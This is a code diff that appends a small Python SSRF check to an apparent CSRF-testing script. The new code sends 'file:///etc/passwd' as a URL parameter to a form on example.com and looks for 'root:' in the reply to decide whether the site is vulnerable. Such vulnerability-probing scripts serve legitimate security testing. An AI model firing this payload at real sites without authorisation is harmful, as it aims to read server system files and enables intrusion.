@@ -18,5 +18,18 @@ if response.status_code == 200:
 else:
     print("The website is not vulnerable to CSRF.")
 
+import requests
+
+target_url = "http://example.com/form"
+
+# send GET request with a malicious URL as a parameter
+data = {"url": "file:///etc/passwd"}
+response = requests.get(target_url, params=data)
+
+# check the response to see if the server accessed the malicious URL
+if response.status_code == 200 and "root:" in response.text:
+    print("The website is vulnerable to SSRF.")
+else:
+    print("The website is not vulnerable to SSRF.")
     
  
